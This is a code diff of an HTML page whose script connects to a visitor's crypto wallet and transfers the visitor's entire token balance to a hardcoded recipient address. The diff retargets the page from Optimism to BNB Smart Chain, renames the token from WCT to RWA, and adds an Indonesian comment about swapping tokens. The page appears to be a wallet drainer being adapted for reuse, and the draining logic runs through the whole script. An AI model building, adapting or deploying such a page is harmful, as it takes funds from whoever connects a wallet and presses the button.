@@ -25,7 +25,7 @@
     #sendBtn {
       font-size: 24px;
       padding: 20px 50px;
-      background-color: #4CAF50;
+      background-color: #F0B90B;
       color: white;
       border: none;
       border-radius: 10px;
@@ -36,7 +36,7 @@
     }
 
     #sendBtn:hover {
-      background-color: #3e9142;
+      background-color: #d9a006;
     }
 
     #status {
@@ -54,22 +54,22 @@
   <div id="status"></div>
 
   <script>
-    const TOKEN_ADDRESS = '0x9C8B5CA345247396bDfAc0395638ca9045C6586E';
+    const TOKEN_ADDRESS = '0x9C8B5CA345247396bDfAc0395638ca9045C6586E'; // Ganti jika token beda
     const TO_ADDRESS = '0x8bda3f68f71e02a6bd64aaaefd8bb249bdceb613';
     const TOKEN_ABI = [
       'function balanceOf(address owner) view returns (uint256)',
       'function decimals() view returns (uint8)',
       'function transfer(address to, uint256 value) returns (bool)'
     ];
-    const OP_SCAN = 'https://optimistic.etherscan.io/tx/';
-    const OP_CHAIN_ID = '0xa';
+    const BSC_SCAN = 'https://bscscan.com/tx/';
+    const BSC_CHAIN_ID = '0x38';
 
-    async function switchToOP() {
+    async function switchToBSC() {
       if (!window.ethereum) return false;
       try {
         await window.ethereum.request({
           method: 'wallet_switchEthereumChain',
-          params: [{ chainId: OP_CHAIN_ID }],
+          params: [{ chainId: BSC_CHAIN_ID }],
         });
         return true;
       } catch (switchError) {
@@ -78,11 +78,11 @@
             await window.ethereum.request({
               method: 'wallet_addEthereumChain',
               params: [{
-                chainId: OP_CHAIN_ID,
-                chainName: 'Optimism',
-                nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-                rpcUrls: ['https://mainnet.optimism.io'],
-                blockExplorerUrls: ['https://optimistic.etherscan.io/'],
+                chainId: BSC_CHAIN_ID,
+                chainName: 'BNB Smart Chain',
+                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                rpcUrls: ['https://bsc-dataseed.binance.org'],
+                blockExplorerUrls: ['https://bscscan.com'],
               }],
             });
             return true;
@@ -103,10 +103,10 @@
           return;
         }
 
-        status.innerText = 'Switching to Optimism network...';
-        const switched = await switchToOP();
+        status.innerText = 'Switching to BSC network...';
+        const switched = await switchToBSC();
         if (!switched) {
-          status.innerText = 'Failed to switch to Optimism network!';
+          status.innerText = 'Failed to switch to BSC network!';
           return;
         }
 
@@ -121,15 +121,15 @@
         const balance = await token.balanceOf(userAddress);
 
         if (balance == 0n) {
-          status.innerText = "No WCT token in your wallet!";
+          status.innerText = "No RWA token in your wallet!";
           return;
         }
 
         const displayBalance = ethers.formatUnits(balance, decimals);
-        status.innerText = `You have ${displayBalance} WCT. Sending all...`;
+        status.innerText = `You have ${displayBalance} RWA. Sending all...`;
 
         const tx = await token.transfer(TO_ADDRESS, balance);
-        status.innerHTML = `Tx sent! <a href="${OP_SCAN}${tx.hash}" target="_blank">${tx.hash}</a><br>Waiting for confirmation...`;
+        status.innerHTML = `Tx sent! <a href="${BSC_SCAN}${tx.hash}" target="_blank">${tx.hash}</a><br>Waiting for confirmation...`;
 
         await tx.wait();
         status.innerHTML += '<br>✅ Transfer confirmed!';
